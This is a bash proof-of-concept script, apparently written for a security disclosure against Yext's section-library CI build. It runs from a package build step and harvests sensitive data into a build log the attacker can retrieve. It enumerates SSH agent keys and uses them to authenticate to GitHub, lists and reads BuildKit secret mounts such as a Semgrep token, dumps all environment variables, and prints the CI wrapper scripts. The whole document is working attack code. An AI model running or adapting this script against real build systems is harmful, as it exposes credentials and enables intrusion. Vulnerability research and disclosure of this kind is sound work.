#!/usr/bin/env bash
# Yext Sites section-library CI - credential exposure PoC collector
# Read-only. Writes nothing, deletes nothing, modifies no Yext state.
# Runs from package.json "build", i.e. inside:
#   [stage-1 16/18] RUN --mount=type=ssh,id=deps_key,uid=2500 /scripts/user_commands/build.sh
# All output lands in the revision build log, retrievable by the library owner via
#   yext.publish.sectionlibraries.v1.SectionLibraryApi/GetSectionLibraryRevisionBuildLogs
set +e
B="YEXTPOC7731"
echo "$B-BEGIN"

echo "$B === 1. IDENTITY (expect uid 2500 yextci) ==="
whoami 2>&1; id 2>&1; hostname 2>&1; pwd 2>&1

echo "$B === 2. SSH AGENT: is deps_key reachable from repo-controlled build code? ==="
echo "SSH_AUTH_SOCK=$SSH_AUTH_SOCK"
ls -la "$SSH_AUTH_SOCK" 2>&1
echo "--- ssh-add -l (fingerprints + key comments) ---"
ssh-add -l 2>&1
echo "--- ssh-add -L (public keys in agent; an agent never exports private keys) ---"
ssh-add -L 2>&1

echo "$B === 3. WHOSE IDENTITY DOES THE AGENT AUTHENTICATE AS? ==="
ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=15 \
    -T git@github.com 2>&1
echo "--- git op over the agent, against a PUBLIC repo only ---"
git ls-remote git@github.com:yext-section-libraries/standard-library.git 2>&1 | head -3

echo "$B === 4. BUILDKIT SECRET MOUNTS (paths taken from the disclosed RUN bodies) ==="
ls -la /run/secrets/ 2>&1
echo "--- semgrep_app_token (mounted in the semgrep-scan stage; expected absent here) ---"
cat /run/secrets/semgrep_app_token 2>&1

echo "$B === 5. ENVIRONMENT ==="
printenv 2>&1 | sort

echo "$B === 6. CI WRAPPER SCRIPTS (the pipeline the build logs reference) ==="
ls -la /scripts /scripts/bin /scripts/user_commands 2>&1
echo "--- /scripts/user_commands/build.sh ---"
cat /scripts/user_commands/build.sh 2>&1
echo "--- /scripts/mark-builderror.sh ---"
cat /scripts/mark-builderror.sh 2>&1
echo "--- /scripts/user_commands/install_deps.sh ---"
cat /scripts/user_commands/install_deps.sh 2>&1

echo "$B-END"
exit 0
